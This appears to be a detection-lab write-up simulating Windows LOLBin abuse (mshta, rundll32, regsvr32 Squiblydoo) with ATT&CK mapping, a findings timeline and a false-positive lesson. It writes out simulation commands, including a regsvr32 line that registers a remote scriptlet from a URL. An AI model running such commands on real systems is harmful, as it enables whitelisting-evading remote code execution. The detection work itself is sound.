# Scenario 06 — LOLBins & Execution Abuse

## 🎯 Objective
Simulate and detect attacker abuse of Living off the Land Binaries (LOLBins) — trusted, Microsoft-signed Windows executables repurposed to execute or stage malicious content while evading signature-based detection.

## 🧩 MITRE ATT&CK Mapping
| Technique | ID |
|---|---|
| System Binary Proxy Execution: Mshta | T1218.005 |
| System Binary Proxy Execution: Rundll32 | T1218.011 |
| System Binary Proxy Execution: Regsvr32 (Squiblydoo) | T1218.010 |
| Ingress Tool Transfer | T1105 |

## 🖥️ Attack Simulation

**1. mshta.exe — inline JavaScript execution**
```cmd
mshta.exe javascript:alert('LOLBin Simulation Test');
```

**2. rundll32.exe — arbitrary DLL export execution**
```cmd
rundll32.exe shell32.dll,Control_RunDLL
```

**3. regsvr32.exe — Squiblydoo remote scriptlet registration**
```cmd
regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com scrobj.dll
```

## 🔍 Detection Queries
See [`lolbin_execution_detection.spl`](../../SPL-Queries/lolbin_execution_detection.spl) for the full query set, including the false-positive tuning query that filters out legitimate `rundll32.exe` background-task noise.

## 📊 Key Findings
| Time | Event | Technique |
|---|---|---|
| 09:31:14 | mshta.exe inline JavaScript execution | T1218.005 |
| 09:31:23 | rundll32.exe Control_RunDLL export | T1218.011 |
| 09:31:43 | regsvr32.exe Squiblydoo remote scriptlet | T1218.010 / T1105 |

**Real SOC lesson:** `rundll32.exe` also fired from legitimate Windows background tasks (`PcaSvc.dll`, `AppXDeploymentExtensions.OneCore.dll`) under the machine account `JIMIL-JOSHI$` — confirming that binary-name-only detection is too noisy, and that argument-level filtering is required for reliable alerting.

## 🟠 Verdict
Confirmed simulated LOLBin execution abuse — all three techniques successfully detected and correctly differentiated from legitimate system noise.

## 📁 Related Files
- Full investigation report: [`Investigation-Reports/lolbin_execution_IR-2026-007.md`](../../Investigation-Reports/lolbin_execution_IR-2026-007.md)
- Formal incident report: [`Incident-Reports/IR-2026-007_LOLBin_Execution.docx`](../../Incident-Reports/IR-2026-007_LOLBin_Execution.docx)
- SPL queries: [`SPL-Queries/lolbin_execution_detection.spl`](../../SPL-Queries/lolbin_execution_detection.spl)
